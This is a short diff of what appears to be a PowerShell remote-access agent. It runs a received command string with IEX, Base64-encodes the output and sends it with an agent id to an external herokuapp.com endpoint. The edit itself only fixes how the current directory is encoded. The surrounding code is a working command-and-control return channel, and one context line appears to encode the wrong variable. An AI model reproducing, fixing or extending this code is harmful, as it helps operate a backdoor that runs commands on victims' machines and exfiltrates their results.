@@ -156,7 +156,7 @@ $out = IEX $s;
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($out)
 $encoded = [Convert]::ToBase64String($Bytes)
 
-$Bytess = [System.Text.Encoding]::Unicode.GetBytes(Get-Location)
+$Bytess = [System.Text.Encoding]::Unicode.GetBytes((Get-Location))
 $encodeds = [Convert]::ToBase64String($Bytes)
 
 $WebClient.DownloadString("http://y44v5ltr.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
